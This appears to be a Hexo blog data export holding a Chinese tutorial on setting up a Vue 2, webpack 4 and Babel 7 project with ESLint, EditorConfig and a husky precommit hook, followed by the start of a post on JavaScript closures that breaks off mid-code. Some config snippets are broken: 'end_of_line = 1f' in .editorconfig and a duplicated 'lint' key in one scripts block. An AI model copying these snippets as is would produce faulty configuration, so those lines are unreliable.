EditorConfig\n编辑器插件，让不同编辑器下编写代码用相同的规则处理。\n\n根目录创建`.editorconfig`文件，配置如下：\n```\nroot = true\n\n[*]\ncharset = utf-8\nend_of_line = 1f\nindent_size = 2\nindent_style = space\ninsert_final_newline = true\ntrim_trailing_whitespace = true\n```\n\n### precommit\ngit提交前进行eslint检测，保证不合规范的代码无法提交到远程库。注意，这是针对git提交，因此我们要先保证目录下已经完成git初始化（git init），会在.git文件夹下的hooks目录下生成各种文件。关于git钩子插件的更多介绍可以看[这里](https://www.jianshu.com/p/f0d31f92bfab)。\n\n```shell\nnpm i husky -D\n```\n`package.json`修改为：\n```json\n\"scripts\": {\n  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",\n  \"lint-fix\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\",\n  \"precommit\": \"npm run lint-fix\"\n}\n```\n\n# 后记","slug":"2019-04-04-vue-webpack-project","published":1,"_id":"ck0m3d8x80056wovvqjbjcmmn","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>从实际出发，手动从零搭建一个vue开发工程。从基本依赖到工程工具到代码规范到生产打包，从不同功能层面逐步安装，并作对应说明。技术栈：vue2.x+webpack4.x+babel7.x。<a href=\"https://github.com/jovysun/vue-webpack-project\" target=\"_blank\" rel=\"noopener\">完整代码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm init</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"基本环境\"><a href=\"#基本环境\" class=\"headerlink\" title=\"基本环境\"></a>基本环境</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i vue vue-router vuex -S</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i webpack webpack-cli vue-loader css-loader vue-style-loader vue-template-compiler -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"静态资源\"><a href=\"#静态资源\" class=\"headerlink\" title=\"静态资源\"></a>静态资源</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i url-loader file-loader -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"scss预编译\"><a href=\"#scss预编译\" class=\"headerlink\" title=\"scss预编译\"></a>scss预编译</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i sass-loader node-sass -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"开发server\"><a href=\"#开发server\" class=\"headerlink\" title=\"开发server\"></a>开发server</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i webpack-dev-server html-webpack-plugin -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"postcss\"><a href=\"#postcss\" class=\"headerlink\" title=\"postcss\"></a>postcss</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i postcss-loader autoprefixer -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"Babel-7-x\"><a href=\"#Babel-7-x\" class=\"headerlink\" title=\"Babel 7.x\"></a>Babel 7.x</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 基本配置</span><br><span class=\"line\">npm i @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime @babel/runtime-corejs2 -D</span><br><span class=\"line\"><span class=\"meta\">#</span> .vue开发环境</span><br><span class=\"line\">npm i babel-plugin-transform-vue-jsx babel-helper-vue-jsx-merge-props babel-plugin-syntax-jsx babel-plugin-dynamic-import-webpack -D</span><br><span class=\"line\"><span class=\"meta\">#</span> webpack环境的loader</span><br><span class=\"line\">npm i babel-loader -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"css分离\"><a href=\"#css分离\" class=\"headerlink\" title=\"css分离\"></a>css分离</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i mini-css-extract-plugin -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"跨平台设置环境参数与删除文件工具\"><a href=\"#跨平台设置环境参数与删除文件工具\" class=\"headerlink\" title=\"跨平台设置环境参数与删除文件工具\"></a>跨平台设置环境参数与删除文件工具</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i cross-env rimraf -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"前端gzip压缩\"><a href=\"#前端gzip压缩\" class=\"headerlink\" title=\"前端gzip压缩\"></a>前端gzip压缩</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i compression-webpack-plugin -D</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码规范\"><a href=\"#代码规范\" class=\"headerlink\" title=\"代码规范\"></a>代码规范</h2><h3 id=\"ESlint\"><a href=\"#ESlint\" class=\"headerlink\" title=\"ESlint\"></a>ESlint</h3><h4 id=\"js检测\"><a href=\"#js检测\" class=\"headerlink\" title=\".js检测\"></a><code>.js</code>检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i eslint eslint-config-standard eslint-plugin-standard eslint-plugin-promise eslint-plugin-import eslint-plugin-node -D</span><br></pre></td></tr></table></figure>\n<h4 id=\"vue检测\"><a href=\"#vue检测\" class=\"headerlink\" title=\".vue检测\"></a><code>.vue</code>检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i eslint-plugin-vue -D</span><br></pre></td></tr></table></figure>\n<h4 id=\"根目录下创建-eslintrc文件，配置如下：\"><a href=\"#根目录下创建-eslintrc文件，配置如下：\" class=\"headerlink\" title=\"根目录下创建.eslintrc文件，配置如下：\"></a>根目录下创建<code>.eslintrc</code>文件，配置如下：</h4><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"extends\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"standard\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"plugin:vue/recommended\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"parserOptions\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"parser\"</span>: <span class=\"string\">\"babel-eslint\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"sourceType\"</span>: <span class=\"string\">\"module\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"package-json中添加执行检测命令和检测并自动修复命令\"><a href=\"#package-json中添加执行检测命令和检测并自动修复命令\" class=\"headerlink\" title=\"package.json中添加执行检测命令和检测并自动修复命令\"></a><code>package.json</code>中添加执行检测命令和检测并自动修复命令</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",</span><br><span class=\"line\">  \"lint\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"编码时检测\"><a href=\"#编码时检测\" class=\"headerlink\" title=\"编码时检测\"></a>编码时检测</h4><p><code>babel-eslint</code>用途是我们代码都是经过babel编译的，有些语法不是标准的eslint规范，因此需要指定parser为<code>babel-eslint</code>。<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i eslint-loader babel-eslint -D</span><br></pre></td></tr></table></figure></p>\n<p><code>.eslintrc</code>文件修改如下<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"extends\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"standard\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"plugin:vue/recommended\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"parserOptions\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"parser\"</span>: <span class=\"string\">\"babel-eslint\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"sourceType\"</span>: <span class=\"string\">\"module\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>配置<code>eslint-loader</code><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rules: [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/\\.(vue|js|jsx)$/</span>,</span><br><span class=\"line\">    loader: <span class=\"string\">'eslint-loader'</span>,</span><br><span class=\"line\">    exclude: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">    enforce: <span class=\"string\">'pre'</span> <span class=\"comment\">//预处理，在其他loader（如vue-loader）处理前先处理</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"忽略指定文件，例如忽略dist文件夹\"><a href=\"#忽略指定文件，例如忽略dist文件夹\" class=\"headerlink\" title=\"忽略指定文件，例如忽略dist文件夹\"></a>忽略指定文件，例如忽略dist文件夹</h4><p>创建<code>.eslintignore</code>，配置如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dist</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"EditorConfig\"><a href=\"#EditorConfig\" class=\"headerlink\" title=\"EditorConfig\"></a>EditorConfig</h3><p>编辑器插件，让不同编辑器下编写代码用相同的规则处理。</p>\n<p>根目录创建<code>.editorconfig</code>文件，配置如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root = true</span><br><span class=\"line\"></span><br><span class=\"line\">[*]</span><br><span class=\"line\">charset = utf-8</span><br><span class=\"line\">end_of_line = 1f</span><br><span class=\"line\">indent_size = 2</span><br><span class=\"line\">indent_style = space</span><br><span class=\"line\">insert_final_newline = true</span><br><span class=\"line\">trim_trailing_whitespace = true</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"precommit\"><a href=\"#precommit\" class=\"headerlink\" title=\"precommit\"></a>precommit</h3><p>git提交前进行eslint检测，保证不合规范的代码无法提交到远程库。注意，这是针对git提交，因此我们要先保证目录下已经完成git初始化（git init），会在.git文件夹下的hooks目录下生成各种文件。关于git钩子插件的更多介绍可以看<a href=\"https://www.jianshu.com/p/f0d31f92bfab\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i husky -D</span><br></pre></td></tr></table></figure>\n<p><code>package.json</code>修改为：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",</span><br><span class=\"line\">  \"lint-fix\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\",</span><br><span class=\"line\">  \"precommit\": \"npm run lint-fix\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>从实际出发，手动从零搭建一个vue开发工程。从基本依赖到工程工具到代码规范到生产打包，从不同功能层面逐步安装，并作对应说明。技术栈：vue2.x+webpack4.x+babel7.x。<a href=\"https://github.com/jovysun/vue-webpack-project\" target=\"_blank\" rel=\"noopener\">完整代码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm init</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"基本环境\"><a href=\"#基本环境\" class=\"headerlink\" title=\"基本环境\"></a>基本环境</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i vue vue-router vuex -S</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i webpack webpack-cli vue-loader css-loader vue-style-loader vue-template-compiler -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"静态资源\"><a href=\"#静态资源\" class=\"headerlink\" title=\"静态资源\"></a>静态资源</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i url-loader file-loader -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"scss预编译\"><a href=\"#scss预编译\" class=\"headerlink\" title=\"scss预编译\"></a>scss预编译</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i sass-loader node-sass -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"开发server\"><a href=\"#开发server\" class=\"headerlink\" title=\"开发server\"></a>开发server</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i webpack-dev-server html-webpack-plugin -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"postcss\"><a href=\"#postcss\" class=\"headerlink\" title=\"postcss\"></a>postcss</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i postcss-loader autoprefixer -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"Babel-7-x\"><a href=\"#Babel-7-x\" class=\"headerlink\" title=\"Babel 7.x\"></a>Babel 7.x</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 基本配置</span><br><span class=\"line\">npm i @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime @babel/runtime-corejs2 -D</span><br><span class=\"line\"><span class=\"meta\">#</span> .vue开发环境</span><br><span class=\"line\">npm i babel-plugin-transform-vue-jsx babel-helper-vue-jsx-merge-props babel-plugin-syntax-jsx babel-plugin-dynamic-import-webpack -D</span><br><span class=\"line\"><span class=\"meta\">#</span> webpack环境的loader</span><br><span class=\"line\">npm i babel-loader -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"css分离\"><a href=\"#css分离\" class=\"headerlink\" title=\"css分离\"></a>css分离</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i mini-css-extract-plugin -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"跨平台设置环境参数与删除文件工具\"><a href=\"#跨平台设置环境参数与删除文件工具\" class=\"headerlink\" title=\"跨平台设置环境参数与删除文件工具\"></a>跨平台设置环境参数与删除文件工具</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i cross-env rimraf -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"前端gzip压缩\"><a href=\"#前端gzip压缩\" class=\"headerlink\" title=\"前端gzip压缩\"></a>前端gzip压缩</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i compression-webpack-plugin -D</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码规范\"><a href=\"#代码规范\" class=\"headerlink\" title=\"代码规范\"></a>代码规范</h2><h3 id=\"ESlint\"><a href=\"#ESlint\" class=\"headerlink\" title=\"ESlint\"></a>ESlint</h3><h4 id=\"js检测\"><a href=\"#js检测\" class=\"headerlink\" title=\".js检测\"></a><code>.js</code>检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i eslint eslint-config-standard eslint-plugin-standard eslint-plugin-promise eslint-plugin-import eslint-plugin-node -D</span><br></pre></td></tr></table></figure>\n<h4 id=\"vue检测\"><a href=\"#vue检测\" class=\"headerlink\" title=\".vue检测\"></a><code>.vue</code>检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i eslint-plugin-vue -D</span><br></pre></td></tr></table></figure>\n<h4 id=\"根目录下创建-eslintrc文件，配置如下：\"><a href=\"#根目录下创建-eslintrc文件，配置如下：\" class=\"headerlink\" title=\"根目录下创建.eslintrc文件，配置如下：\"></a>根目录下创建<code>.eslintrc</code>文件，配置如下：</h4><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"extends\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"standard\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"plugin:vue/recommended\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"parserOptions\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"parser\"</span>: <span class=\"string\">\"babel-eslint\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"sourceType\"</span>: <span class=\"string\">\"module\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"package-json中添加执行检测命令和检测并自动修复命令\"><a href=\"#package-json中添加执行检测命令和检测并自动修复命令\" class=\"headerlink\" title=\"package.json中添加执行检测命令和检测并自动修复命令\"></a><code>package.json</code>中添加执行检测命令和检测并自动修复命令</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",</span><br><span class=\"line\">  \"lint\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"编码时检测\"><a href=\"#编码时检测\" class=\"headerlink\" title=\"编码时检测\"></a>编码时检测</h4><p><code>babel-eslint</code>用途是我们代码都是经过babel编译的，有些语法不是标准的eslint规范，因此需要指定parser为<code>babel-eslint</code>。<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i eslint-loader babel-eslint -D</span><br></pre></td></tr></table></figure></p>\n<p><code>.eslintrc</code>文件修改如下<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"extends\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"standard\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"plugin:vue/recommended\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"parserOptions\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"parser\"</span>: <span class=\"string\">\"babel-eslint\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"sourceType\"</span>: <span class=\"string\">\"module\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>配置<code>eslint-loader</code><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rules: [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/\\.(vue|js|jsx)$/</span>,</span><br><span class=\"line\">    loader: <span class=\"string\">'eslint-loader'</span>,</span><br><span class=\"line\">    exclude: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">    enforce: <span class=\"string\">'pre'</span> <span class=\"comment\">//预处理，在其他loader（如vue-loader）处理前先处理</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"忽略指定文件，例如忽略dist文件夹\"><a href=\"#忽略指定文件，例如忽略dist文件夹\" class=\"headerlink\" title=\"忽略指定文件，例如忽略dist文件夹\"></a>忽略指定文件，例如忽略dist文件夹</h4><p>创建<code>.eslintignore</code>，配置如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dist</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"EditorConfig\"><a href=\"#EditorConfig\" class=\"headerlink\" title=\"EditorConfig\"></a>EditorConfig</h3><p>编辑器插件，让不同编辑器下编写代码用相同的规则处理。</p>\n<p>根目录创建<code>.editorconfig</code>文件，配置如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root = true</span><br><span class=\"line\"></span><br><span class=\"line\">[*]</span><br><span class=\"line\">charset = utf-8</span><br><span class=\"line\">end_of_line = 1f</span><br><span class=\"line\">indent_size = 2</span><br><span class=\"line\">indent_style = space</span><br><span class=\"line\">insert_final_newline = true</span><br><span class=\"line\">trim_trailing_whitespace = true</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"precommit\"><a href=\"#precommit\" class=\"headerlink\" title=\"precommit\"></a>precommit</h3><p>git提交前进行eslint检测，保证不合规范的代码无法提交到远程库。注意，这是针对git提交，因此我们要先保证目录下已经完成git初始化（git init），会在.git文件夹下的hooks目录下生成各种文件。关于git钩子插件的更多介绍可以看<a href=\"https://www.jianshu.com/p/f0d31f92bfab\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i husky -D</span><br></pre></td></tr></table></figure>\n<p><code>package.json</code>修改为：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"lint\": \"eslint --ext .js --ext .jsx --ext .vue src/\",</span><br><span class=\"line\">  \"lint-fix\": \"eslint --fix --ext .js --ext .jsx --ext .vue src/\",</span><br><span class=\"line\">  \"precommit\": \"npm run lint-fix\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>"},{"title":"闭包--知识总结及实践","date":"2019-02-01T02:20:40.000Z","updated":"2019-02-01T02:20:40.000Z","_content":"# 概述\n\n闭包是 JS 中一个很重要的概念，也是面试中时常被考察的部分。所谓闭包，就是函数中的函数，重点要理解作用域链问题。真是“请神容易送神难”，一旦请进了闭包，那么想结束这段关系，可就不是你包含函数说了算的，那要看被包含函数（闭包）的心情（姐说不玩了才能结束）。\n\n<!-- more -->\n\n# 详述\n\n## 闭包与变量\n\n_想包养可以，条件是咱们共享 wallet_\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var w = 0; w < 10; w++) {\n    result[w] = function() {\n      return w;\n    };\n  }\n  return result;\n}\nvar fns = createFunctions();\nfns[2](); //10\n```\n\n_你们还是太年轻啊，叔我的策略是：定值 money_\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var i = 0; i < 10; i++) {\n    result[i] = (function(num) {\n      return function() {\n        return num;\n      };\n    })(i);\n  }\n  return result;\n}\nvar fns = createFunctions();\nfns[2](); //2\n```\n\n## 关于 this 对象\n\n_我曾天真的以为，被包养就是拿别人的钱享受自己的人生_\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    return function() {\n      return this.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"The Window\"（在非严格模式下）\n```\n\n_人老珠黄时才忽然明白，只有放到自己名下的才是自己的_\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    var that = this;\n    return function() {\n      return that.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"My Object\"\n```\n\n## 实现`add(2)(3)`\n\n```js\nfunction add(a) {\n  return function(b) {\n    return a + b;\n  };\n}\nadd(2)(3);\n```\n## 循环中创建闭包问题\n```js\nvar btnList = document.getElementsByClassName(\"btn\");\nfor (var i = 0; i < btnList.length; i++) {\n  btnList[i].onclick = function() {\n    console.log(\"第\" + i + \"个按钮被点击到了\");\n  };\n}\n\n// 解决方法\nfor (var i = 0; i < btnList.length; i++) {\n  (function(j) {\n    